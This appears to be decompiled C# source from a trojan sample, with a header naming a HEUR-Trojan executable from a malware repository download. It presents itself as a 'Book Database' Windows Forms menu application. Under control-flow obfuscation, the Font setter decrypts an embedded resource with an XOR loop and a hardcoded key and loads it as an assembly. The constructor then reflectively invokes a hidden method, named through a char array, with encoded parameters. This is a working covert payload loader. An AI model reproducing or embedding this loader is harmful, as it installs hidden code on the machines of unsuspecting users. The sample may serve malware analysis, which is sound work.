// Decompiled with JetBrains decompiler
// Type: ProjNet.Candidates.SerializerMerchantCandidate
// Assembly: IRefl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A29A65F6-B7ED-422C-83D4-B9EFD61E5F13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-8e89881e34371e10b7f9cb943183a061aab9b22853cb7192e1ac09401f4cc545.exe

using IRefl.Composer;
using IRefl.Definitions;
using IRefl.Pools;
using IRefl.Producers;
using IRefl.Resolver;
using IRefl.Wrappers;
using ProjNet.Bridges;
using ProjNet.Common;
using ProjNet.Services;
using ProjNet.States;
using ProjNet.Structs;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ProjNet.Candidates
{
  public class SerializerMerchantCandidate : Form
  {
    private IContainer _ComparatorRegistry;
    private static object identifierRegistry;
    private MenuStrip _AnnotationRegistry;
    private ToolStripMenuItem m_ParamsRegistry;
    private ToolStripMenuItem _RepositoryRegistry;
    private ToolStripMenuItem m_ConfigRegistry;
    private ToolStripMenuItem m_AdapterRegistry;
    private ToolStripMenuItem _StubRegistry;
    private ToolStripMenuItem m_MockRegistry;
    private ToolStripMenuItem m_TagRegistry;
    private ToolStripMenuItem _ExpressionRegistry;
    private ToolStripMenuItem _ValRegistry;
    private ToolStripMenuItem m_ProducerRegistry;
    private ToolStripMenuItem _AttributeRegistry;
    private ToolStripMenuItem baseRegistry;
    private ToolStripMenuItem _ManagerRegistry;
    private ToolStripMenuItem setterRegistry;
    private ToolStripMenuItem requestRegistry;
    private ToolStripMenuItem m_MethodRegistry;
    private ToolStripMenuItem taskRegistry;
    private ToolStripMenuItem _TemplateRegistry;
    private ToolStripMenuItem _DispatcherRegistry;
    private ToolStripMenuItem helperRegistry;
    private ToolStripMenuItem factoryRegistry;
    private ToolStripMenuItem m_SchemaRegistry;
    private ToolStripMenuItem recordRegistry;
    private ToolStripMenuItem _ClassRegistry;
    private ToolStripMenuItem structRegistry;
    private ToolStripMenuItem m_AlgoRegistry;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public SerializerMerchantCandidate()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        MethodInfo method;
        string[] parameters;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
              PageAdvisorStructBuilder.PrepareCreator();
              num2 = 2;
              continue;
            case 1:
            case 2:
              this._ComparatorRegistry = (IContainer) null;
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_2;
            case 3:
              goto label_2;
            case 4:
              // ISSUE: explicit constructor call
              base.\u002Ector();
              this.CalculateFacade();
              method = ((System.Type) SerializerMerchantCandidate.identifierRegistry).GetMethod(new string(new char[11]
              {
                'I',
                'n',
                'v',
                'a',
                'l',
                'i',
                'd',
                'C',
                'a',
                's',
                't'
              }));
              parameters = new string[3]{ "63", null, null };
              goto case 6;
            case 6:
              parameters[1] = "596E735A425269";
              parameters[2] = "linqdb";
              num2 = 3;
              continue;
            case 7:
              goto label_9;
            default:
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto case 0;
          }
        }
label_2:
        method.Invoke((object) 0, (object[]) parameters);
        num1 = 7;
      }
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void LogoutFacade(object asset, EventArgs cont)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void IncludeFacade(object spec, EventArgs caller) => Application.Exit();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PublishFacade(object last, EventArgs visitor)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_6;
            case 1:
            case 3:
              form.MdiParent = (Form) this;
              goto case 2;
            case 2:
            case 4:
              form.Show();
              num2 = 5;
              continue;
            case 5:
              goto label_7;
            default:
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_6;
          }
        }
label_6:
        form = (Form) new InfoValuePool();
        num1 = 3;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FlushFacade(object res, EventArgs cust)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              goto label_6;
            case 1:
            case 2:
              form.MdiParent = (Form) this;
              goto case 3;
            case 3:
              form.Show();
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto case 1;
            case 5:
              goto label_7;
            default:
              goto label_5;
          }
        }
label_5:
        num1 = 3;
        continue;
label_6:
        form = (Form) new RegAdvisorStructBuilder();
        num1 = 2;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CalcFacade(object res, EventArgs counter)
    {
      int num1 = 0;
      if (SerializerMerchantCandidate.InitModel())
        goto label_5;
label_1:
      Form form;
      form.Show();
      int num2 = 5;
label_4:
      num1 = num2;
label_5:
      switch (num1)
      {
        case 0:
          form = (Form) new InitializerAdvisor();
          num2 = 4;
          goto label_4;
        case 1:
        case 4:
          form.MdiParent = (Form) this;
          goto label_1;
        case 2:
        case 3:
          goto label_1;
        case 5:
          break;
        default:
          num2 = 3;
          goto label_4;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CloneFacade(object task, EventArgs map)
    {
      int num1 = 2;
      if (SerializerMerchantCandidate.ListModel())
        ;
      while (true)
      {
        Form form;
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
            form = (Form) new ReponseAdvisor();
            num2 = 4;
            break;
          case 1:
          case 4:
            form.MdiParent = (Form) this;
            goto case 3;
          case 3:
            form.Show();
            num2 = 5;
            break;
          case 5:
            goto label_1;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
      }
label_1:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void GetFacade(object value, EventArgs vis)
    {
      int num = 2;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            form = (Form) new SystemAdvisor();
            num = 4;
            continue;
          case 1:
          case 4:
            form.MdiParent = (Form) this;
            goto case 3;
          case 3:
            form.Show();
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num = 3;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CompareFacade(object ident, EventArgs counter)
    {
      int num = 2;
      if (SerializerMerchantCandidate.ListModel())
        ;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            form = (Form) new RulesAdvisor();
            if (SerializerMerchantCandidate.InitModel())
            {
              num = 4;
              continue;
            }
            goto case 1;
          case 1:
          case 4:
            form.MdiParent = (Form) this;
            goto case 3;
          case 3:
            form.Show();
            num = 5;
            continue;
          case 5:
            goto label_1;
          default:
            num = 3;
            continue;
        }
      }
label_1:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void LoginFacade(object config, EventArgs cont)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 3:
              goto label_2;
            case 4:
              form = (Form) new PredicateSingletonWrapper();
              if (!SerializerMerchantCandidate.ListModel())
              {
                num2 = 3;
                continue;
              }
              goto label_7;
            case 5:
              goto label_8;
            default:
              num2 = 0;
              continue;
          }
        }
label_1:
        form.Show();
        num1 = 5;
        continue;
label_2:
        form.MdiParent = (Form) this;
        goto label_1;
      }
label_8:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ListFacade(object task, EventArgs map)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 4:
              form.MdiParent = (Form) this;
              goto case 3;
            case 3:
              form.Show();
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_7;
            case 5:
              goto label_8;
            default:
              goto label_5;
          }
        }
label_1:
        form = (Form) new QueueMerchantCandidate();
        num1 = 4;
        continue;
label_5:
        num1 = 3;
      }
label_8:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void VerifyFacade(object spec, EventArgs map)
    {
      int num = 3;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            form = (Form) new ValStatusService();
            num = 2;
            continue;
          case 1:
          case 2:
            form.MdiParent = (Form) this;
            goto case 4;
          case 4:
            form.Show();
            if (true)
            {
              num = 5;
              continue;
            }
            goto case 1;
          case 5:
            goto label_6;
          default:
            num = 4;
            continue;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ViewFacade(object res, EventArgs pol)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              form.MdiParent = (Form) this;
              goto case 2;
            case 2:
            case 3:
              form.Show();
              int num3 = 5;
              num2 = SerializerMerchantCandidate.ListModel() ? num3 : num3;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_2;
            default:
              goto label_7;
          }
        }
label_3:
        form = (Form) new ConnectionTokenizerResolver();
        num1 = 0;
        continue;
label_7:
        num1 = 3;
      }
label_2:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RegisterFacade(object var1, EventArgs pol)
    {
      int num1 = 3;
      if (true)
        goto label_3;
label_1:
      Form form;
      form.MdiParent = (Form) this;
      goto label_5;
label_3:
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 1:
            goto label_1;
          case 2:
          case 4:
            goto label_5;
          case 3:
            form = (Form) new ProducerStatusService();
            num2 = 0;
            break;
          case 5:
            goto label_6;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_6:
      return;
label_5:
      form.Show();
      int num3 = 5;
      num1 = SerializerMerchantCandidate.ListModel() ? num3 : num3;
      goto label_3;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PopFacade(object info, EventArgs ivk)
    {
      int num = 3;
      Form form;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 3:
            form = (Form) new FilterAdvisor();
            if (true)
            {
              num = 4;
              continue;
            }
            goto case 1;
          case 1:
          case 2:
            form.Show();
            if (SerializerMerchantCandidate.InitModel())
            {
              num = 5;
              continue;
            }
            goto label_6;
          case 4:
            form.MdiParent = (Form) this;
            goto case 1;
          case 5:
            goto label_8;
          default:
            num = 1;
            continue;
        }
      }
label_8:
      return;
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SetFacade(object i, EventArgs selection)
    {
      int num1 = 4;
      if (true)
        goto label_5;
label_1:
      Form form;
      form.Show();
      int num2 = 5;
label_4:
      num1 = num2;
label_5:
      switch (num1)
      {
        case 0:
        case 2:
          goto label_1;
        case 1:
        case 3:
          form.MdiParent = (Form) this;
          goto label_1;
        case 4:
          form = (Form) new ListenerRegistry();
          num2 = 3;
          goto label_4;
        case 5:
          break;
        default:
          num2 = 0;
          goto label_4;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PrepareFacade(object reference, EventArgs counter)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              form.MdiParent = (Form) this;
              goto case 2;
            case 2:
            case 3:
              form.Show();
              num2 = 5;
              continue;
            case 4:
              goto label_2;
            case 5:
              goto label_7;
            default:
              goto label_6;
          }
        }
label_2:
        form = (Form) new ProxyAdvisorStructBuilder();
        num1 = 0;
        continue;
label_6:
        num1 = 3;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CancelFacade(object v, EventArgs counter)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Form form;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              form = (Form) new WorkerItemState();
              if (SerializerMerchantCandidate.InitModel())
              {
                num2 = 3;
                continue;
              }
              goto label_3;
            case 1:
            case 3:
              goto label_3;
            case 2:
              goto label_1;
            case 5:
              goto label_8;
            default:
              goto label_6;
          }
        }
label_1:
        form.Show();
        num1 = 5;
        continue;
label_3:
        form.MdiParent = (Form) this;
        goto label_1;
label_6:
        num1 = 2;
      }
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FillFacade(object i, EventArgs selection)
    {
      int num1 = 0;
      if (true)
        goto label_5;
label_1:
      Form form;
      form.Show();
      num1 = 5;
label_5:
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
            form = (Form) new CallbackAdvisor();
            num2 = 4;
            break;
          case 1:
          case 4:
            goto label_3;
          case 2:
          case 3:
            goto label_1;
          case 5:
            goto label_7;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
      }
label_3:
      form.MdiParent = (Form) this;
      goto label_1;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SetupFacade(object first, EventArgs caller)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_6;
            case 1:
            case 3:
              goto label_1;
            case 2:
            case 4:
              goto label_5;
            case 5:
              goto label_7;
            default:
              num2 = 4;
              continue;
          }
        }
label_1:
        Form form;
        form.MdiParent = (Form) this;
label_5:
        form.Show();
        num1 = 5;
        continue;
label_6:
        form = (Form) new ProcessAdvisor();
        num1 = 3;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool removevalue)
    {
      int num1 = 2;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
            if (removevalue)
            {
              num1 = 4;
              continue;
            }
            num2 = 0;
            goto label_7;
          case 1:
          case 4:
            num2 = this._ComparatorRegistry != null ? 1 : 0;
            goto label_7;
          case 3:
label_1:
            this._ComparatorRegistry.Dispose();
            break;
          case 5:
            goto label_8;
          default:
            num1 = 3;
            continue;
        }
label_2:
        base.Dispose(removevalue);
        num1 = 5;
        continue;
label_7:
        if (num2 == 0)
          goto label_2;
        else
          goto label_1;
      }
label_8:;
    }

    public override Font Font
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => base.Font;
      [MethodImpl(MethodImplOptions.NoInlining)] set => SerializerMerchantCandidate.ValidateFacade();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string ValidateFacade()
    {
      int num1 = 1;
      if (true)
        goto label_8;
label_1:
      string str1;
      string str2 = str1;
      if (SerializerMerchantCandidate.InitModel())
      {
        num1 = 7;
        goto label_8;
      }
label_2:
      byte[] rawAssembly;
      SerializerMerchantCandidate.AwakeFacade(AppDomain.CurrentDomain.Load(rawAssembly), 1);
      int num2 = 5;
label_7:
      num1 = num2;
label_8:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
            goto label_2;
          case 1:
            goto label_4;
          case 2:
            goto label_6;
          case 4:
          case 5:
            goto label_1;
          case 6:
            goto label_3;
          case 7:
            goto label_10;
          default:
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto label_10;
        }
      }
label_3:
      ResourceManager resourceManager;
      rawAssembly = (byte[]) resourceManager.GetObject("Chi");
      str1 = "C58B575PE978EA88DE4F5W";
      int num3 = 25622;
      num2 = 2;
      goto label_7;
label_4:
      resourceManager = new ResourceManager(typeof (ListenerRegistry));
      num2 = 6;
      goto label_7;
label_6:
      for (; num3 >= 0; num3 += -1)
        rawAssembly[num3 % 12800] = Convert.ToByte((uint) ((int) Convert.ToUInt32((int) rawAssembly[num3 % 12800] ^ (int) str1[num3 % 22]) - (int) Convert.ToUInt32(rawAssembly[(num3 + 1) % 12800]) + 256) % 256U);
      goto label_2;
label_10:
      return str2;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void AwakeFacade(Assembly info, int visitor_ID) => SerializerMerchantCandidate.identifierRegistry = (object) info.GetType("Evercraft_model.Character");

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CalculateFacade()
    {
      int num1 = 36;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              this._ClassRegistry.Size = new Size(152, 22);
              this._ClassRegistry.Text = "AuthorISBN";
              this._ClassRegistry.Click += new EventHandler(this.CancelFacade);
              this.structRegistry.Name = "authorISBNToolStripMenuItem1";
              this.structRegistry.Size = new Size(152, 22);
              if (true)
              {
                num2 = 14;
                continue;
              }
              goto label_15;
            case 1:
              goto label_7;
            case 2:
              this.m_ProducerRegistry = new ToolStripMenuItem();
              this._AttributeRegistry = new ToolStripMenuItem();
              if (true)
              {
                num2 = 31;
                continue;
              }
              goto case 9;
            case 3:
              goto label_22;
            case 4:
            case 13:
              this.m_ProducerRegistry.Name = "titlesToolStripMenuItem";
              this.m_ProducerRegistry.Size = new Size(145, 22);
              this.m_ProducerRegistry.Text = "Titles";
              this.m_ProducerRegistry.Click += new EventHandler(this.FlushFacade);
              this._AttributeRegistry.Name = "authorISBNSToolStripMenuItem";
              this._AttributeRegistry.Size = new Size(145, 22);
              if (true)
              {
                num2 = 34;
                continue;
              }
              goto label_30;
            case 5:
              this.AutoScaleDimensions = new SizeF(6f, 13f);
              if (SerializerMerchantCandidate.InitModel())
              {
                num2 = 10;
                continue;
              }
              goto label_9;
            case 6:
              goto label_35;
            case 7:
              goto label_25;
            case 8:
              goto label_19;
            case 9:
              this.factoryRegistry = new ToolStripMenuItem();
              this.recordRegistry = new ToolStripMenuItem();
              this.m_MockRegistry = new ToolStripMenuItem();
              this.m_TagRegistry = new ToolStripMenuItem();
              this.requestRegistry = new ToolStripMenuItem();
              this.m_MethodRegistry = new ToolStripMenuItem();
              this._ExpressionRegistry = new ToolStripMenuItem();
              this.taskRegistry = new ToolStripMenuItem();
              this._TemplateRegistry = new ToolStripMenuItem();
              this._ValRegistry = new ToolStripMenuItem();
              this._DispatcherRegistry = new ToolStripMenuItem();
              this.helperRegistry = new ToolStripMenuItem();
              this._ClassRegistry = new ToolStripMenuItem();
              this.structRegistry = new ToolStripMenuItem();
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto case 0;
            case 10:
              this.AutoScaleMode = AutoScaleMode.Font;
              this.ClientSize = new Size(892, 530);
              this.Controls.Add((Control) this._AnnotationRegistry);
              this.IsMdiContainer = true;
              this.MainMenuStrip = this._AnnotationRegistry;
              num2 = 16;
              continue;
            case 11:
              goto label_23;
            case 12:
              this._ValRegistry.Text = "Delete";
              this._DispatcherRegistry.Name = "authorToolStripMenuItem2";
              this._DispatcherRegistry.Size = new Size(152, 22);
              this._DispatcherRegistry.Text = "Author";
              this._DispatcherRegistry.Click += new EventHandler(this.SetFacade);
              this.helperRegistry.Name = "tItleToolStripMenuItem2";
              this.helperRegistry.Size = new Size(152, 22);
              this.helperRegistry.Text = "Title";
              this.helperRegistry.Click += new EventHandler(this.PrepareFacade);
              this._ClassRegistry.Name = "authorISBNToolStripMenuItem";
              num2 = 0;
              continue;
            case 14:
              this.structRegistry.Text = "AuthorISBN";
              this.structRegistry.Click += new EventHandler(this.FillFacade);
              num2 = 32;
              continue;
            case 15:
              goto label_26;
            case 16:
              this.Font = new Font("Arial", 20f);
              this.Name = "MainForm";
              this.Text = "Book Database";
              this.Load += new EventHandler(this.LogoutFacade);
              this._AnnotationRegistry.ResumeLayout(false);
              this._AnnotationRegistry.PerformLayout();
              this.ResumeLayout(false);
              this.PerformLayout();
              if (SerializerMerchantCandidate.InitModel())
              {
                num2 = 39;
                continue;
              }
              goto label_19;
            case 17:
              goto label_20;
            case 18:
              this.m_ParamsRegistry.DropDownItems.AddRange(new ToolStripItem[1]
              {
                (ToolStripItem) this._RepositoryRegistry
              });
              this.m_ParamsRegistry.Name = "fileToolStripMenuItem";
              this.m_ParamsRegistry.Size = new Size(37, 20);
              this.m_ParamsRegistry.Text = "File";
              this._RepositoryRegistry.Name = "exitToolStripMenuItem";
              this._RepositoryRegistry.Size = new Size(92, 22);
              this._RepositoryRegistry.Text = "Exit";
              this._RepositoryRegistry.Click += new EventHandler(this.IncludeFacade);
              this.m_ConfigRegistry.DropDownItems.AddRange(new ToolStripItem[2]
              {
                (ToolStripItem) this.m_AdapterRegistry,
                (ToolStripItem) this.baseRegistry
              });
              this.m_ConfigRegistry.Name = "readToolStripMenuItem";
              this.m_ConfigRegistry.Size = new Size(45, 20);
              if (true)
              {
                num2 = 25;
                continue;
              }
              goto case 10;
            case 19:
              this._ManagerRegistry.Text = "Search for Author";
              this._ManagerRegistry.Click += new EventHandler(this.GetFacade);
              this.setterRegistry.Name = "searchForTitleToolStripMenuItem";
              this.setterRegistry.Size = new Size(172, 22);
              this.setterRegistry.Text = "Search for Title";
              this.setterRegistry.Click += new EventHandler(this.CompareFacade);
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto label_2;
            case 20:
              goto label_15;
            case 21:
              this.m_TagRegistry.Size = new Size(152, 22);
              this.m_TagRegistry.Text = "Insert";
              this.requestRegistry.Name = "authorToolStripMenuItem";
              this.requestRegistry.Size = new Size(152, 22);
              if (true)
              {
                num2 = 15;
                continue;
              }
              goto case 34;
            case 22:
              this.SuspendLayout();
              this._AnnotationRegistry.Items.AddRange(new ToolStripItem[3]
              {
                (ToolStripItem) this.m_ParamsRegistry,
                (ToolStripItem) this.m_ConfigRegistry,
                (ToolStripItem) this.m_MockRegistry
              });
              this._AnnotationRegistry.Location = new Point(0, 0);
              num2 = 8;
              continue;
            case 23:
            case 27:
              this._TemplateRegistry.Text = "Title";
              this._TemplateRegistry.Click += new EventHandler(this.PopFacade);
              int num3 = 20;
              num2 = SerializerMerchantCandidate.ListModel() ? num3 : num3;
              continue;
            case 24:
              this.m_AdapterRegistry.DropDownItems.AddRange(new ToolStripItem[4]
              {
                (ToolStripItem) this._StubRegistry,
                (ToolStripItem) this.m_ProducerRegistry,
                (ToolStripItem) this._AttributeRegistry,
                (ToolStripItem) this.m_SchemaRegistry
              });
              if (SerializerMerchantCandidate.InitModel())
              {
                num2 = 33;
                continue;
              }
              goto case 25;
            case 25:
              this.m_ConfigRegistry.Text = "Read";
              num2 = 24;
              continue;
            case 26:
              goto label_31;
            case 28:
              goto label_21;
            case 29:
              goto label_2;
            case 30:
              goto label_33;
            case 31:
              goto label_34;
            case 32:
              goto label_30;
            case 33:
              goto label_24;
            case 34:
              this._AttributeRegistry.Text = "AuthorISBNS";
              if (true)
              {
                num2 = 26;
                continue;
              }
              goto case 16;
            case 35:
              goto label_3;
            case 36:
              goto label_6;
            case 37:
              goto label_9;
            case 38:
              this._ExpressionRegistry.Text = "Update";
              this.taskRegistry.Name = "authorToolStripMenuItem1";
              this.taskRegistry.Size = new Size(152, 22);
              this.taskRegistry.Text = "Author";
              this.taskRegistry.Click += new EventHandler(this.RegisterFacade);
              this._TemplateRegistry.Name = "titleToolStripMenuItem1";
              this._TemplateRegistry.Size = new Size(152, 22);
              num2 = 23;
              continue;
            case 39:
              goto label_41;
            default:
              num2 = 11;
              continue;
          }
        }
label_2:
        this.recordRegistry.Name = "searchAuthorsAndISBNsToolStripMenuItem";
        this.recordRegistry.Size = new Size(172, 22);
        this.recordRegistry.Text = "Authors and ISBNs";
        this.recordRegistry.Click += new EventHandler(this.ListFacade);
        this.m_MockRegistry.DropDownItems.AddRange(new ToolStripItem[3]
        {
          (ToolStripItem) this.m_TagRegistry,
          (ToolStripItem) this._ExpressionRegistry,
          (ToolStripItem) this._ValRegistry
        });
        num1 = 28;
        continue;
label_3:
        this.m_AlgoRegistry.Click += new EventHandler(this.SetupFacade);
        num1 = 5;
        continue;
label_6:
        this._AnnotationRegistry = new MenuStrip();
        num1 = 7;
        continue;
label_7:
        this.m_AlgoRegistry = new ToolStripMenuItem();
        this._AnnotationRegistry.SuspendLayout();
        num1 = 22;
        continue;
label_9:
        this._AnnotationRegistry.TabIndex = 0;
        this._AnnotationRegistry.Text = "menuStrip1";
        num1 = 18;
        continue;
label_15:
        this._ValRegistry.DropDownItems.AddRange(new ToolStripItem[3]
        {
          (ToolStripItem) this._DispatcherRegistry,
          (ToolStripItem) this.helperRegistry,
          (ToolStripItem) this.m_AlgoRegistry
        });
        this._ValRegistry.Name = "deleteToolStripMenuItem";
        this._ValRegistry.Size = new Size(152, 22);
        num1 = 12;
        continue;
label_19:
        this._AnnotationRegistry.Name = "menuStrip1";
        this._AnnotationRegistry.Size = new Size(892, 24);
        num1 = 37;
        continue;
label_20:
        this.baseRegistry.Name = "queriesToolStripMenuItem";
        this.baseRegistry.Size = new Size(152, 22);
        this.baseRegistry.Text = "Queries";
        this._ManagerRegistry.Name = "searchForAuthorToolStripMenuItem";
        this._ManagerRegistry.Size = new Size(172, 22);
        num1 = 19;
        continue;
label_21:
        this.m_MockRegistry.Name = "insertUpdateDeleteToolStripMenuItem";
        this.m_MockRegistry.Size = new Size(129, 20);
        this.m_MockRegistry.Text = "Insert/Update/Delete";
        this.m_TagRegistry.DropDownItems.AddRange(new ToolStripItem[3]
        {
          (ToolStripItem) this.requestRegistry,
          (ToolStripItem) this.m_MethodRegistry,
          (ToolStripItem) this._ClassRegistry
        });
        this.m_TagRegistry.Name = "insertToolStripMenuItem";
        num1 = 21;
        continue;
label_22:
        this.m_MethodRegistry.Name = "titleToolStripMenuItem";
        this.m_MethodRegistry.Size = new Size(152, 22);
        this.m_MethodRegistry.Text = "Title";
        this.m_MethodRegistry.Click += new EventHandler(this.ViewFacade);
        num1 = 30;
        continue;
label_23:
        this.factoryRegistry.Text = "Authors and Titles";
        this.factoryRegistry.Click += new EventHandler(this.LoginFacade);
        num1 = 29;
        continue;
label_24:
        this.m_AdapterRegistry.Name = "tableToolStripMenuItem";
        this.m_AdapterRegistry.Size = new Size(152, 22);
        this.m_AdapterRegistry.Text = "Table";
        this._StubRegistry.Name = "authorsToolStripMenuItem";
        this._StubRegistry.Size = new Size(145, 22);
        this._StubRegistry.Text = "Authors";
        this._StubRegistry.Click += new EventHandler(this.PublishFacade);
        num1 = 4;
        continue;
label_25:
        this.m_ParamsRegistry = new ToolStripMenuItem();
        this._RepositoryRegistry = new ToolStripMenuItem();
        this.m_ConfigRegistry = new ToolStripMenuItem();
        this.m_AdapterRegistry = new ToolStripMenuItem();
        this._StubRegistry = new ToolStripMenuItem();
        num1 = 2;
        continue;
label_26:
        this.requestRegistry.Text = "Author";
        this.requestRegistry.Click += new EventHandler(this.VerifyFacade);
        num1 = 3;
        continue;
label_30:
        this.m_AlgoRegistry.Name = "authorISBNToolStripMenuItem2";
        this.m_AlgoRegistry.Size = new Size(152, 22);
        this.m_AlgoRegistry.Text = "AuthorISBN";
        num1 = 35;
        continue;
label_31:
        this._AttributeRegistry.Click += new EventHandler(this.CalcFacade);
        this.m_SchemaRegistry.Name = "masterDetailToolStripMenuItem";
        this.m_SchemaRegistry.Size = new Size(145, 22);
        this.m_SchemaRegistry.Text = "Master/Detail";
        this.m_SchemaRegistry.Click += new EventHandler(this.CloneFacade);
        this.baseRegistry.DropDownItems.AddRange(new ToolStripItem[4]
        {
          (ToolStripItem) this._ManagerRegistry,
          (ToolStripItem) this.setterRegistry,
          (ToolStripItem) this.factoryRegistry,
          (ToolStripItem) this.recordRegistry
        });
        num1 = 17;
        continue;
label_33:
        this._ExpressionRegistry.DropDownItems.AddRange(new ToolStripItem[3]
        {
          (ToolStripItem) this.taskRegistry,
          (ToolStripItem) this._TemplateRegistry,
          (ToolStripItem) this.structRegistry
        });
        this._ExpressionRegistry.Name = "updateToolStripMenuItem";
        this._ExpressionRegistry.Size = new Size(152, 22);
        num1 = 38;
        continue;
label_34:
        this.m_SchemaRegistry = new ToolStripMenuItem();
        this.baseRegistry = new ToolStripMenuItem();
        this._ManagerRegistry = new ToolStripMenuItem();
        this.setterRegistry = new ToolStripMenuItem();
        num1 = 9;
        continue;
label_35:
        this.factoryRegistry.Name = "searchAuthorsTitlesToolStripMenuItem";
        this.factoryRegistry.Size = new Size(172, 22);
        goto label_23;
      }
label_41:;
    }

    internal static bool InitModel() => true;

    internal static bool ListModel() => false;
  }
}
